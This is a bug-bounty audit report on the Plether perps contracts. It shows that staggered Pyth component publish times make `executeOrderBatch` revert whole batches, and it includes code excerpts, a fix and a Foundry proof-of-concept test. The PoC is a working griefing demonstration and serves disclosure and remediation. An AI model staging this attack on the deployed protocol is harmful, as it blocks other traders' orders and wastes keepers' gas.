# \#99675 [SC-Medium] Staggered Pyth component times make valid order batches revert

**Submitted on Nov 14th 2026 at 19:14:21 UTC by @Abhan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99675
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
`executeOrderBatch` resolves the first order's basket from signed Pyth data and then reuses that basket for later orders in the same batch, but the reuse path checks stored Pyth storage with a stricter rule than the one that accepted the basket in the first place. When basket components first publish at different seconds, which the oracle explicitly allows up to its 5-second divergence limit, the first order resolves correctly and the reuse for the second order demands that every stored component has reached the basket's newest publish time. The component that published earlier cannot meet that demand, so `PletherOracle__StoredFeedBehind` reverts the entire batch, rolling back the first order's valid execution as well. Any trader can set this up by committing an ordinary order one second behind someone else's order; the only outside condition is that the components publish at slightly different seconds inside the permitted window. In the PoC, which uses release parameters, the production router and oracle and only Pyth and USDG mocks, a batch carrying Alice's valid order and Mallory's order reverts with zero orders processed, Alice's order stays at the FIFO head, and the keeper's gas is wasted, while the very same signed payload executes both orders when they are sent one at a time.

## Vulnerability Details

Plether prices a delayed order from the first eligible post-commit Pyth update of each basket component. Inside `executeOrderBatch`, the router keeps the first basket it resolves in memory and offers it to later orders in the batch whenever both commits come before every component of that basket. For that reuse to be correct, it has to keep the same per-component coverage rule that let the first order resolve.

When the first order is resolved, `PletherOracle._resolveHistoricalOrderBasket` parses the unique post-commit updates, computes the basket, writes the updates into Pyth storage, and then checks each stored component against that component's own parsed publish time:

```solidity
// PletherOracle.sol L617-L626 (_resolveHistoricalOrderBasket)
basket = _computeBasketPriceFromFeeds(
    PriceMode.OrderExecution, parsedFeeds, maxComponentPublishTimeDivergence
);
// Reverts in the success body are NOT caught by the historical-parse catch below.
// Keep the parsed basket as the pricing source even if storage already contains newer prices.
pyth.updatePriceFeeds{value: pythFee}(pythUpdateData);
for (uint256 i; i < parsedFeeds.length; ++i) {
    _requireStoredFeedCoverage(parsedFeeds[i].id, parsedFeeds[i].price.publishTime);
}
```

The cache handed back to the router records the basket's newest component time as `cache.publishTime`. When the router offers that cache for the next order, `updateBatchOrderExecutionPrice` takes the reuse branch and checks every stored component against that single newest time instead:

```solidity
// PletherOracle.sol L262-L266 (updateBatchOrderExecutionPrice)
if (!policy.oracleFrozen && _canReuseHistoricalBatchBasket(request.commitTime, cache)) {
    // Cache contents are caller-supplied; independently prove storage coverage, not price authenticity.
    for (uint256 i; i < pythFeedIds.length; ++i) {
        _requireStoredFeedCoverage(pythFeedIds[i], cache.publishTime);
    }
```

```solidity
// PletherOracle.sol L645-L653
function _requireStoredFeedCoverage(
    bytes32 feedId,
    uint256 requiredPublishTime
) internal view {
    uint256 storedPublishTime = pyth.getPriceUnsafe(feedId).publishTime;
    if (storedPublishTime < requiredPublishTime) {
        revert PletherOracle__StoredFeedBehind(feedId, storedPublishTime, requiredPublishTime);
    }
}
```

Take Alice committing at `t` and Mallory committing at `t+1`. One component first publishes at `t+2` and the other at `t+4`. Both updates come after both commits, both fall inside the 15-second `orderSettlementWindow`, and their 2-second gap is inside the 5-second `maxComponentPublishTimeDivergence`. At `t+6` a keeper sends the batch. Alice's order resolves: the earlier component is stored at `t+2`, the later one at `t+4`, and each passes its own check. The router's timing predicate then accepts the cache for Mallory's order and forwards no further Pyth fee. In the reuse branch the oracle requires every stored component to be at least `t+4`, and the component stored at `t+2` fails a requirement it was never meant to meet.

`OrderRouterExecutionSidecar._prepareBatchOracle` (L982-L1029) only catches `PletherOracle__HistoricalParserFailure`; any other revert from the oracle, including `StoredFeedBehind`, is re-thrown as is. The whole transaction unwinds, including Alice's valid execution and the Pyth storage writes made for her order. Nothing here needs a fabricated cache or a bad signed report: the cache is the one the router itself produced for the first item, and every price update is ordinary signed data.

## Impact Details

The batch processes zero orders and the keeper pays the gas of a reverted transaction. Alice's valid order is left at the FIFO head and Mallory's order is left pending behind it, so the batch execution path is interrupted for time-sensitive orders. Mallory needs no privilege and no capital beyond an ordinary small order committed one second after Alice's, and gains nothing from the revert, which matches the in-scope Medium impact "Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)". The orders can still be executed with separate single-order calls using the same payload, but that needs a new execution attempt for each order, and if none arrives before an order's deadline the affected order can expire.

## Recommendation

Make the reuse check match the rule that accepted the basket: store each component's own publish time in the batch cache and check every stored component against its own time (or against the basket's oldest component time) rather than against the basket's newest time, or, if the stronger check fails, fall back to resolving the later order from the signed payload instead of reverting the whole batch.

## References

The first resolution checks each component against its own publish time: [PletherOracle.sol#L617-L626](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol?plain=1#L617-L626)

The reuse path checks every component against the newest time: [PletherOracle.sol#L262-L266](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol?plain=1#L262-L266)

The coverage check that reverts: [PletherOracle.sol#L645-L653](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/PletherOracle.sol?plain=1#L645-L653)

The batch path re-throws the revert and unwinds the batch: [OrderRouterExecutionSidecar.sol#L982-L1029](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouterExecutionSidecar.sol?plain=1#L982-L1029)


## Proof of Concept

## Proof of Concept

The vulnerability is demonstrated by a runnable Foundry test against the audit repository, `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The complete test code is included at the end of this section.

The test extends the repository's own `BasePerpTest` harness (`packages/perps/test/perps/BasePerpTest.sol`) and does not modify any contract under `src/`. The only mocks are the repository's Pyth and USDG test contracts; the repository's `MockPyth` models Pyth's per-feed storage updates and unique historical parsing. Every order goes through the production V3 entry point `IPerpsTraderActions.commitOrder(OrderRequest)`, and orders are executed through the permissionless `router.executeOrderBatch` and `router.executeOrder` by an arbitrary keeper address. The LP deposit uses the public request → `router.settleLpEpoch` → claim flow, mark refreshes go through the permissionless `router.updateMarkPrice`, and no protocol contract is impersonated. The test applies the release parameters from `DEPLOYMENT.md` and asserts the 15-second `orderSettlementWindow` and the 5-second `maxComponentPublishTimeDivergence`. The repository's test basket has two Pyth components, feed A and feed B; the release basket has six, and the check works the same way for any number of components.

### Step-by-step (`test_StaggeredComponentsRevertWholeBatch`)

**Setup.** An LP deposits 10,000,000 USDG of Junior, and Alice and Mallory fund their clearinghouse accounts. On Tuesday 10:00 UTC a keeper refreshes the mark at 1.00.

**Commits.** Alice commits a 100,000-token LONG open at time `t` and is the FIFO head. Mallory commits a 1,000-token SHORT open at `t+1`.

**Batch.** At `t+6` a keeper calls `executeOrderBatch` with a signed payload in which feed A first publishes at `t+2` and feed B at `t+4`, both with a previous publish time before Alice's commit. The batch reverts with `PletherOracle__StoredFeedBehind`.

**State after the revert.** The FIFO head is still Alice's order, both orders are still `Pending`, and neither Alice nor Mallory has a position.

**Singles.** The keeper then executes Alice's order and, one second later, Mallory's order with `executeOrder` and the same payload. Both execute.

### Other scenarios covered by the test

`test_Control_EqualComponentTimesBatchSucceeds` is the control. With both components first publishing at `t+4`, the identical batch reuses the cached basket and executes both orders in one transaction, which shows that only the staggered component times cause the revert.

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the test code below as packages/perps/test/poc/BatchCacheStaggeredFeedsRevert.t.sol
cd packages/perps
FOUNDRY_TEST=test/poc FOUNDRY_SCRIPT=test/poc forge test --match-path test/poc/BatchCacheStaggeredFeedsRevert.t.sol -vv
```

The two `FOUNDRY_*` variables limit compilation to the PoC. The package builds with via-IR, so compiling its whole test suite takes much longer; running without them also works. Expected result: `Suite result: ok. 2 passed; 0 failed; 0 skipped`.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @title A valid order batch reverts when basket components first publish at different seconds
/// @notice Alice commits at t and Mallory commits at t+1. Feed A first publishes at t+2 and feed B at t+4: both are
///         after both commits, inside the 15 s settlement window and within the 5 s component-divergence limit.
///         `executeOrderBatch` resolves Alice's order from the signed payload, checking each stored feed against its
///         own publish time. It then reuses the cached basket for Mallory's order, but the reuse path requires every
///         stored feed to reach the basket's newest time (t+4). Feed A is stored at t+2, so `StoredFeedBehind`
///         reverts the whole batch, including Alice's valid execution.
/// @dev Release parameters from packages/perps/DEPLOYMENT.md. Production V3 `commitOrder`, permissionless
///      `executeOrderBatch` / `executeOrder` / `updateMarkPrice` / `settleLpEpoch`. The repository's test basket has
///      two Pyth components (feed A and feed B). Pyth and USDG are the only mocks. No contract under src/ is modified
///      or impersonated.
contract BatchCacheStaggeredFeedsRevertTest is BasePerpTest {

    address internal constant ALICE = address(0xA11CE); // honest trader at the FIFO head
    address internal constant MALLORY = address(0x3A11); // trader who places an order right behind Alice
    address internal constant KEEPER = address(0xBEEF); // honest keeper
    address internal constant LP = address(0x1B);

    uint256 internal constant PRICE = 1e8;
    uint256 internal constant TUE_NOV10_1000 = 1_794_304_800; // Tue 2026-11-10 10:00:00 UTC (regular trading)

    // ------------------------------------------------------------------------------------------------------------
    // Release configuration
    // ------------------------------------------------------------------------------------------------------------

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);

        // The admin timelocks above end inside a weekend closure; resume on the next Monday 10:00 UTC.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        _publicJuniorDeposit(LP, 10_000_000e6);

        _goto(TUE_NOV10_1000);
        assertFalse(engine.isOracleFrozen(), "regular trading hours");
        assertEq(router.pletherOracle().orderSettlementWindow(), 15, "release settlement window");
        assertEq(router.pletherOracle().maxComponentPublishTimeDivergence(), 5, "release component divergence");
        _fundTrader(ALICE, 100_000e6);
        _fundTrader(MALLORY, 10_000e6);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Helpers (public entry points only)
    // ------------------------------------------------------------------------------------------------------------

    function _goto(
        uint256 timestamp
    ) internal {
        require(timestamp >= vm.getBlockTimestamp(), "time moves forward");
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _feedTick(
        uint256 feed,
        uint256 publishTime,
        uint256 prevPublishTime
    ) internal pure returns (MockPyth.FeedUpdate memory) {
        return MockPyth.FeedUpdate(
            _basePythFeedIds()[feed],
            MockPyth.MockPrice(SafeCast.toInt64(SafeCast.toInt256(PRICE)), 0, -8, publishTime, prevPublishTime)
        );
    }

    /// @dev Signed payload: feed A published at `timeA`, feed B at `timeB`, both with previous publish `prev`.
    function _payload(
        uint256 timeA,
        uint256 timeB,
        uint256 prev
    ) internal pure returns (bytes[] memory data) {
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](2);
        ticks[0] = _feedTick(0, timeA, prev);
        ticks[1] = _feedTick(1, timeB, prev);
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    function _markNow() internal {
        uint256 t = vm.getBlockTimestamp();
        bytes[] memory data = _payload(t, t, t - 1);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    function _publicJuniorDeposit(
        address lp,
        uint256 amount
    ) internal {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        _goto(juniorVault.depositEpochStart(requestId));
        uint256 t = vm.getBlockTimestamp();
        bytes[] memory data = _payload(t, t, t - 1);
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
        assertEq(juniorVault.claimableDepositRequest(requestId, lp), amount, "deposit activated in full");
        vm.prank(lp);
        juniorVault.claimDeposit(requestId, amount, lp, lp);
    }

    function _commitOpen(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin
    ) internal returns (uint64 orderId) {
        uint256 window = router.maxExecutionWindowSeconds();
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: side == CfdTypes.Side.LONG ? 1 : type(uint256).max,
            isClose: false,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(account);
        orderId = IPerpsTraderActions(address(router)).commitOrder(request);
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _status(
        uint64 orderId
    ) internal view returns (uint8) {
        return uint8(router.lifecycleBook().lifecycleStatus(orderId));
    }

    /// @dev Alice commits at t, Mallory one second later at t+1. The keeper acts at t+6.
    function _aliceThenMallory() internal returns (uint256 t, uint64 aliceId, uint64 malloryId) {
        _goto(vm.getBlockTimestamp() + 1);
        _markNow();
        _goto(vm.getBlockTimestamp() + 1);
        t = vm.getBlockTimestamp();
        aliceId = _commitOpen(ALICE, CfdTypes.Side.LONG, 100_000e18, 10_000e6);
        _goto(t + 1);
        malloryId = _commitOpen(MALLORY, CfdTypes.Side.SHORT, 1000e18, 500e6);
        assertEq(router.nextExecuteId(), aliceId, "Alice is the FIFO head");
        _goto(t + 6);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------------------------------------------------

    /// @notice Feed A first publishes at t+2 and feed B at t+4. The batch reverts with `StoredFeedBehind`, nothing
    ///         executes, and both orders stay pending with Alice still at the head. The same payload then executes
    ///         both orders one by one.
    function test_StaggeredComponentsRevertWholeBatch() public {
        (uint256 t, uint64 aliceId, uint64 malloryId) = _aliceThenMallory();
        bytes[] memory data = _payload(t + 2, t + 4, t - 1);

        vm.prank(KEEPER);
        vm.expectPartialRevert(IPletherOracle.PletherOracle__StoredFeedBehind.selector);
        router.executeOrderBatch(malloryId, data);
        console2.log("batch reverted with PletherOracle__StoredFeedBehind");

        assertEq(router.nextExecuteId(), aliceId, "FIFO head unchanged");
        assertEq(_size(ALICE), 0, "Alice's valid order did not execute");
        assertEq(_size(MALLORY), 0, "Mallory's order did not execute");
        assertEq(_status(aliceId), uint8(OrderV3Types.LifecycleStatus.Pending), "Alice still pending");
        assertEq(_status(malloryId), uint8(OrderV3Types.LifecycleStatus.Pending), "Mallory still pending");

        // Recovery needs a new execution attempt per order, with the same signed payload.
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r1 = router.executeOrder(aliceId, data);
        _goto(t + 7);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory r2 = router.executeOrder(malloryId, data);
        assertEq(uint8(r1.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Alice executes as a single");
        assertEq(uint8(r2.status), uint8(OrderV3Types.LifecycleStatus.Executed), "Mallory executes as a single");
        console2.log("same payload, single executions: both orders executed");
    }

    /// @notice Control: with both components first publishing at t+4, the identical batch reuses the cached basket
    ///         and executes both orders.
    function test_Control_EqualComponentTimesBatchSucceeds() public {
        (uint256 t,, uint64 malloryId) = _aliceThenMallory();
        bytes[] memory data = _payload(t + 4, t + 4, t - 1);

        vm.prank(KEEPER);
        OrderV3Types.BatchResult memory b = router.executeOrderBatch(malloryId, data);
        assertEq(b.terminalCount, 2, "both orders executed in one batch");
        assertGt(_size(ALICE), 0, "Alice filled");
        assertGt(_size(MALLORY), 0, "Mallory filled");
    }

}
```

